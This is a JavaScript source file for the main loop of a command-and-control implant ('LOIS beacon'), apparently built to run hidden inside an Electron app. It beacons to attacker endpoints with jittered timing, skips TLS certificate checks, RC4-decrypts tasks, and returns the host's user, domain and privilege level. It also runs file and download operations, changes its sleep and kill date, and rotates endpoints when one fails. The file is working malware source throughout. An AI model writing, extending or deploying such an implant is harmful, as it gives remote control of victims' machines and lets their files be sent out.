// agent.js — LOIS beacon main loop (stock beacon_listener_http wire protocol).
// Runs in plain node (dev) and inside an Electron main process (entry.js).
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { load, hostInfo } = require('./config');
const { buildBeat } = require('./beat');
const { rc4 } = require('./rc4');
const { TaskReader, OutPacker, iterateTasks, CP } = require('./tasks');
const fsops = require('./fsops');

// no-arg commands we ack generically (console-compat) rather than desync the stream
const NO_ARG_ACK = new Set([CP.DISKS, CP.REV2SELF]);

function extractData(respBody, cfg) {
  // listener splices RC4(taskstream) raw into the response template
  const text = respBody.toString('latin1');
  const p = text.indexOf(cfg.resp_pre);
  if (p < 0) return null;
  const from = p + cfg.resp_pre.length;
  const to = text.length - cfg.resp_post.length;
  if (to < from) return null;
  return Buffer.from(text.slice(from, to), 'latin1');
}

function request(cfg, headerValue, body, ep) {
  const transport = cfg.ssl ? https : http;
  return new Promise((resolve, reject) => {
    const req = transport.request({
      host: ep.host, port: ep.port, path: cfg.uri, method: cfg.http_method,
      headers: {
        'User-Agent': cfg.user_agent,
        'Content-Type': 'application/octet-stream',
        'Accept': '*/*',
        [cfg.hb_header]: headerValue,
      },
      ...(cfg.ssl ? { rejectUnauthorized: false } : {}),
      timeout: 15000,
    }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(chunks) }));
    });
    req.on('error', reject);
    req.on('timeout', () => req.destroy(new Error('request timeout')));
    if (body && body.length) req.write(body);
    req.end();
  });
}

function jittered(cfg) {
  // WaitMask.cpp: deltaTime = rand % (sleep*jitter/100); sleep*1000 - deltaTime
  // (the upstream seconds-vs-ms unit quirk is preserved deliberately — server
  // side expects this exact cadence envelope)
  const base = cfg.sleep_delay * 1000;
  const minTime = Math.floor((cfg.sleep_delay * cfg.jitter_delay) / 100);
  const dt = minTime ? Math.floor(Math.random() * minTime) : 0;
  return Math.max(0, base - dt);
}

let QUIET = true;
const ts = () => new Date().toISOString().slice(11, 19);
const log = (m) => { if (!QUIET) console.log(`[${ts()}] ${m}`); };

function handleTask(commandId, r, cfg, info, state) {
  const out = new OutPacker();

  if (commandId === CP.PROFILE) {
    const sub = r.u32();
    if (sub === 1) { // sleep change (GUI "sleep")
      const sleep = r.u32(); const jitter = r.u32(); const taskId = r.u32();
      cfg.sleep_delay = sleep; cfg.jitter_delay = jitter;
      return { reply: out.u32(taskId).u32(CP.PROFILE).u32(1).u32(cfg.sleep_delay).u32(cfg.jitter_delay) };
    }
    if (sub === 3) { const taskId = r.u32(); const kill = r.u32(); cfg.kill_date = kill; return { reply: out.u32(taskId).u32(CP.PROFILE).u32(3).u32(kill) }; }
    if (sub === 4) { const taskId = r.u32(); const wt = r.u32(); cfg.working_time = wt; return { reply: out.u32(taskId).u32(CP.PROFILE).u32(4).u32(wt) }; }
    return null; // other subs unimplemented (chunksize etc.)
  }
  if (commandId === CP.TERMINATE) {
    const method = r.u32(); const taskId = r.u32();
    return { reply: out.u32(taskId).u32(CP.TERMINATE).u32(method), exit: true };
  }
  if (commandId === CP.GETUID) {
    const taskId = r.u32();
    return { reply: out.u32(taskId).u32(CP.GETUID).u8(info.elevated ? 1 : 0).str(info.domain_name).str(info.username) };
  }

  const fsReply = fsops.dispatch(commandId, r, cfg, state, OutPacker);
  if (fsReply !== undefined) return fsReply ? { reply: fsReply } : null;

  if (NO_ARG_ACK.has(commandId)) {
    const taskId = r.u32();
    return { reply: out.u32(taskId).u32(commandId).str('lw: command not implemented') };
  }
  // unknown command with args: we cannot know its arg layout -> desync risk.
  // Commander.cpp's `default: break` leaves args UNREAD too, but its Unpacker
  // is cursor-shared the same way — unknown arg-bearing commands desync both
  // implants identically. The stock server only sends ids we handle here.
  log(`[task] cmd ${commandId} — unknown layout, skipped`);
  return null;
}

// fixed agent ids keep ONE session key (server learns it at registration and
// never again); persist a generated key next to the sidecar for relaunches
function persistSessionKey(cfg, key) {
  try {
    if (!cfg.agent_id_explicit || !cfg.__file) return;
    const data = JSON.parse(fs.readFileSync(cfg.__file, 'utf8'));
    if (parseInt(data.agent_id, 16) !== cfg.agent_id) return;
    data.session_key = key.toString('hex');
    fs.writeFileSync(cfg.__file, JSON.stringify(data, null, 2) + '\n');
  } catch (_) {}
}

let epIndex = 0;
function pickEndpoint(cfg) {
  if (cfg.rotation === 'random') epIndex = Math.floor(Math.random() * cfg.endpoints.length);
  return cfg.endpoints[epIndex % cfg.endpoints.length];
}
function rotateEndpoint(cfg, logFn) {
  epIndex = (epIndex + 1) % cfg.endpoints.length;
  const to = cfg.endpoints[epIndex % cfg.endpoints.length];
  logFn(`[-] endpoint failed — rotating to ${to.host}:${to.port}`);
}

async function run() {
  const cfg = load();
  QUIET = !cfg.debug;
  const info = hostInfo(cfg);
  let sessionKey;
  if (cfg.session_key) sessionKey = Buffer.from(cfg.session_key, 'hex');
  else { sessionKey = crypto.randomBytes(16); persistSessionKey(cfg, sessionKey); }

  log(`[*] LOIS agent_id=${cfg.agent_id.toString(16)} -> ${cfg.ssl ? 'https' : 'http'}://${cfg.endpoints[0].host}:${cfg.endpoints[0].port}${cfg.uri}`);
  log(`[*] host: ${info.computer_name} user=${info.username} proc=${info.process_name}`);

  const maxCycles = process.env.MAX_CYCLES ? parseInt(process.env.MAX_CYCLES, 10) : Infinity;
  const state = fsops.createState();
  let cycles = 0, terminate = false, pendingReply = null;

  for (;;) {
    const body = pendingReply || Buffer.alloc(0);
    pendingReply = null;
    try {
      const beat = buildBeat(cfg, hostInfo(cfg), sessionKey); // rebuilt per tick (carries live sleep/jitter)
      const res = await request(cfg, beat.headerValue, body.length ? body : null, pickEndpoint(cfg));
      if (res.status !== 200) {
        log(`[-] non-200 status ${res.status}`);
      } else {
        const blob = extractData(res.body, cfg);
        if (blob && blob.length > 0) {
          const dec = rc4(blob, sessionKey);
          const outputs = new OutPacker();
          let handled = 0;
          try {
            for (const t of iterateTasks(dec)) {
              const h = handleTask(t.commandId, t.reader, cfg, info, state);
              if (h) { handled++; if (h.reply) outputs.parts.push(...h.reply.parts); }
              if (h && h.exit) terminate = true;
            }
          } catch (e) { log(`[-] task parse error: ${e.message}`); }
          fsops.processDownloads(state, outputs, cfg);
          if (outputs.parts.length) {
            const built = outputs.build();
            if (cfg.debug) log(`[dbg] reply plain (${built.length}B): ${built.toString('hex')}`);
            pendingReply = rc4(built, sessionKey);
          }
          if (handled) log(`[+] ${handled} task(s) — reply queued`);
        } else {
          const outputs = new OutPacker();
          fsops.processDownloads(state, outputs, cfg);
          if (outputs.parts.length) pendingReply = rc4(outputs.build(), sessionKey);
          log('[+] tick (no tasks)');
        }
      }
    } catch (err) {
      if (cfg.endpoints.length > 1) rotateEndpoint(cfg, log);
      log(`[-] callback error: ${err.message}`);
    }

    if (++cycles >= maxCycles) { log('[=] MAX_CYCLES reached'); break; }
    if (terminate) { log('[=] TERMINATE'); break; }
    await new Promise((r) => setTimeout(r, jittered(cfg)));
  }
}

if (require.main === module) run().catch((e) => { console.error('fatal', e); process.exit(1); });
module.exports = { run, extractData, handleTask };
